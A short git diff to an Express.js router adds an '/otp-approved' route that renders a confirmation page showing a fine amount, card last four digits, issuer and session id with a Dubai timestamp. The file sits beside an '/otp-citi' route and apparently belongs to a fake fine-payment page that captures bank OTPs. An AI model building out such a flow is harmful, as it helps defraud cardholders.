@@ -80,4 +80,16 @@ router.get('/otp-citi', (req, res) => {
   res.render('otp-citi', { totalFine: parseInt(totalFine)||0, cardLast4, issuer, sid });
 });
 
+router.get('/otp-approved', (req, res) => {
+  const { totalFine='0', cardLast4='****', issuer='', sid='' } = req.query;
+  res.render('otp-approved', {
+    totalFine:  parseInt(totalFine) || 0,
+    cardLast4,
+    issuer,
+    sid,
+    dateStr: new Date().toLocaleDateString('en-AE', { timeZone:'Asia/Dubai', day:'2-digit', month:'long', year:'numeric' }),
+    timeStr: new Date().toLocaleTimeString('en-AE', { timeZone:'Asia/Dubai', hour:'2-digit', minute:'2-digit' }),
+  });
+});
+
 module.exports = router;
